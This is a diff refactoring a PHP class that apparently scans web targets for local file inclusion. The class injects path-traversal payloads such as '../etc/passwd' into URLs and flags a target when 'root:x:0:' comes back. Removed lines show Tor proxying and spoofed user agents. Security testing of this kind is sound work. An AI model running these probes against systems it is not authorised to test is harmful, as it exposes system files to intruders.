@@ -2,17 +2,31 @@
 
 namespace Aszone\Vulnerabilities;
 
-use Aszone\FakeHeaders\FakeHeaders;
-use GuzzleHttp\Client;
+use GuzzleHttp\ClientInterface;
+use Psr\Log\LoggerInterface;
+use Aszone\Vulnerabilities\Log\Logger;
 
-class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScanner
+class LocalFileInclusion implements VulnerabilityScanner
 {
     const EXPLOIT1 = '../etc/passwd';
     const EXPLOIT2 = '../etc/groups';
     const EXPLOIT1REGEX = 'root:x:0:';
     const EXPLOIT2REGEX = 'root:x:0:';
 
-    private $errors = [];
+    private $client;
+
+    private $logger;
+
+    public function __construct(ClientInterface $client, LoggerInterface $logger = null)
+    {
+        $this->client = $client;
+
+        if (empty($logger)) {
+            $logger = new Logger;
+        }
+
+        $this->logger = $logger;
+    }
 
     public function isVulnerable($target)
     {
@@ -31,12 +45,11 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
     protected function verify($target)
     {
         $urls = $this->generateUrls($target);
-
-        $this->output("\n");
+        $this->logger->info('\n');
 
         foreach ($urls as $url) {
             if ($this->attack($url)) {
-                $this->output('Is Vull');
+                $this->logger->info('Is Vull');
 
                 return $url;
             }
@@ -47,26 +60,18 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
 
     protected function attack($url)
     {
-        $this->output('.');
-
-        $header = new FakeHeaders();
-        $client = new Client(['defaults' => [
-            'headers' => ['User-Agent' => $header->getUserAgent()],
-            'proxy' => $this->commandData['tor'],
-            'timeout' => 30,
-        ]]);
+        $this->logger->info('.');
 
         try {
-            $body = $client->get($url)->getBody()->getContents();
+            $body = $this->client->get($url)->getBody()->getContents();
 
             if ($body
                 && $this->checkSuccess($body)
-                && !$this->checkError($body)
             ) {
                 return $url;
             }
         } catch (\Exception $e) {
-            $this->output('#');
+            $this->logger->error('#');
         }
 
         return false;
@@ -79,7 +84,7 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
 
     public function generateUrls($target)
     {
-        $this->output("\n".$target);
+        $this->logger->info('.\n'.$target);
 
         $urls1 = $this->generateUrlsByExploit($target, static::EXPLOIT1);
         $urls2 = $this->generateUrlsByExploit($target, static::EXPLOIT2);
@@ -115,48 +120,6 @@ class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScann
         return $urlFinal;
     }
 
-    public function checkError($body)
-    {
-        $errors = $this->getErrors();
 
-        foreach ($errors as $error) {
-            $isValid = strpos($body, $error);
 
-            if ($isValid !== false) {
-                return true;
-            }
-        }
-
-        return false;
-    }
-
-    protected function getErrors()
-    {
-        if (!$this->errors) {
-            $this->loadErrors();
-        }
-
-        return $this->errors;
-    }
-
-    protected function loadErrors()
-    {
-        $errorsMysql = parse_ini_file(__DIR__.'/../resources/Errors/mysql.ini');
-        $errorsMariaDb = parse_ini_file(__DIR__.'/../resources/Errors/mariadb.ini');
-        $errorsOracle = parse_ini_file(__DIR__.'/../resources/Errors/oracle.ini');
-        $errorssqlServer = parse_ini_file(__DIR__.'/../resources/Errors/sqlserver.ini');
-        $errorsPostgreSql = parse_ini_file(__DIR__.'/../resources/Errors/postgresql.ini');
-        $errorsAsp = parse_ini_file(__DIR__.'/../resources/Errors/asp.ini');
-        $errorsPhp = parse_ini_file(__DIR__.'/../resources/Errors/php.ini');
-
-        $this->errors = array_merge(
-            $errorsMysql,
-            $errorsMariaDb,
-            $errorsOracle,
-            $errorssqlServer,
-            $errorsPostgreSql,
-            $errorsAsp,
-            $errorsPhp
-        );
-    }
 }
